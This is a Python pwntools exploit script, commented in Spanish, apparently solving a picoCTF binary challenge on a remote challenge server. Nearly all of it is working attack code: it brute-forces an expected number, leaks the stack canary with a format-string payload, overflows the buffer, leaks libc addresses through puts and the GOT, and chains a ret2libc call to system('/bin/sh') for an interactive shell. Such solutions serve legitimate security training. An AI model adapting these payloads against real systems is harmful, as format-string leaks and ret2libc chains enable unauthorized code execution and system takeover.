#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = '''
b main
b *0x080487ce
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("jupiter.challenges.picoctf.org", 15815)

    return r


def main():
    r = conn()

    # El programa espera un número que es la dirección de rand % 4096. Ese número no cambia, así que con filtrarlo una vez ya basta.

    # 0x804871a <do_stuff+187>    cmp    eax, dword ptr [ebp - 0x214]     0xfffff571 - 0xfffff571     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
    # >>> 0-2-4-8-128-512-2048
    # -2702

    # Desde gdb se puede comprobar que el número que se espera en el input es -2703

    # num = "-2703".encode()

    # Esto en local funciona, pero en remoto tuve que fuzzearlo, sabiendo que el número va de un rango de -4096 a 4096

    # for i in range(-4096, 4097):
    #     r.sendlineafter('What number would you like to guess?', str(i).encode())
    #     output = r.recvline()
    #     output = r.recvline()
    #     if "Nope" not in output.decode():
    #         print(output)
    #         print(f"Number found: {i}")

    num = "-3727".encode()

    ########
    # Fuzzing del canary: el objetivo es filtrar varias direcciones y ver si alguna es igual a la dirección que da gdb con el comando canary, la cual es —valga la redundancia— el canary. Eso lo hice con un breakpoint: b *0x080487ce
    #
    # start = 0
    # end =  1
    # for x in range(10):
    #     payload = ""
    #     for i in range(start*20, end*20):
    #         payload += f"{i}%{i}$p "
    #     print(payload)
    #     r.sendlineafter('What number would you like to guess?', num)
    #     r.sendlineafter('Name?', payload)
    #     output = r.recvline()
    #     print(output)
    #     start += 1
    #     end += 1
    ########

    canary_pos = 135
    payload_canary = f"%{canary_pos}$p"  # Con esto se va a filtrar el canary en cada ejecución

    r.sendlineafter('What number would you like to guess?', num)
    r.sendlineafter('Name?', payload_canary)
    canary = int(r.recvline().strip(b' Congrats: ').strip(b'\n'), 16)
    print(f"CANARY: {hex(canary)}")
    offset = 512

    # Lo siguiente es calcular cuántos bytes hay entre el canary y el EIP

    # payload = flat({offset: [
    #         canary,
    #         b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab" # pwn cyclic 200
    #      ]})

    # Abriendo gdb con el argumento GDB se puede ver cómo el EIP vale daaa
    # *EIP  0x61616164 ('daaa')
    # pwn cyclic -l daaa
    # 12

    # r.sendlineafter('What number would you like to guess?', num)
    # r.sendlineafter('Name?', payload)

    offset_canary_to_eip = 12
    junk = "A" * 400

    # Una vez se tiene el control del EIP, se puede probar un ret2syscall, pero no hay ningún gadget int 0x80. Se puede hacer un ret2libc, pero no se proporciona la libc, así que el reto será ir filtrando direcciones y usar webs como https://libc.rip/ para que indique, en base a esas direcciones, qué libc puede ser.

    # LEAK PUTS
    payload = flat({offset: [
            canary,
            b"A" * offset_canary_to_eip,
            exe.plt['puts'], exe.symbols['win'], exe.got['puts']
         ]})

    r.sendlineafter('What number would you like to guess?', num)
    r.sendlineafter('Name?', payload)
    output = r.recvline()
    output = r.recvline()
    puts = u32(r.recv(4))
    print(f"PUTS: {hex(puts)}")

    # LEAK PRINTF
    payload = flat({offset: [
            canary,
            b"A" * offset_canary_to_eip,
            exe.plt['puts'], exe.symbols['win'], exe.got['printf']
         ]})
    r.sendlineafter('Name?', payload)
    output = r.recvline()
    output = r.recvline()
    printf = u32(r.recv(4))
    print(f"PRINTF: {hex(printf)}")

    # LEAK GETS
    payload = flat({offset: [
            canary,
            b"A" * offset_canary_to_eip,
            exe.plt['puts'], exe.symbols['win'], exe.got['gets']
         ]})
    r.sendlineafter('Name?', payload)
    output = r.recvline()
    output = r.recvline()
    output = r.recv(4)
    print(f"GETS: {hex(u32(output))}")

    # libc.rip dice que puede ser libc6-i386_2.27-3ubuntu1.6_amd64 o libc6-i386_2.27-3ubuntu1.5_amd64, y en la propia web ya se proporcionan los offsets, así que no hace falta ni descargarla.

    # BuildID   334e2a258b80a51857b0a542d9399aa2f93d4add
    # MD5       ad0c541b7161662aea92ee042d8a4b70
    # __libc_start_main_ret     0x18fa1
    # dup2      0xe6210
    # gets      0x66ce0
    # printf    0x50d60
    # puts      0x67560
    # read      0xe5720
    # str_bin_sh        0x17b9db
    # system    0x3cf10
    # write     0xe57f0

    puts_offset = 0x67560
    printf_offset = 0x50d60
    libc_base = puts - puts_offset
    print(f"PUTS: {hex(puts)} - {hex(puts_offset)} = {hex(puts - puts_offset)}")
    print(f"PRINTF: {hex(printf)} - {hex(printf_offset)} = {hex(printf - printf_offset)}")
    system = libc_base + 0x3cf10
    binsh = libc_base + 0x17b9db
    print(f"system: {hex(system)}")
    print(f"/bin/sh: {hex(binsh)}")

    # El último payload lo que hace es ejecutar system y le pasa como argumento /bin/sh (0xd3b0 es la dirección de retorno. Como da igual a dónde vaya una vez que ha terminado de ejecutar system, se puede poner cualquier cosa).

    payload = flat({offset: [
            canary,
            b"A" * offset_canary_to_eip,
            system, 0xd3b0, binsh
         ]})
    r.sendlineafter('Name?', payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

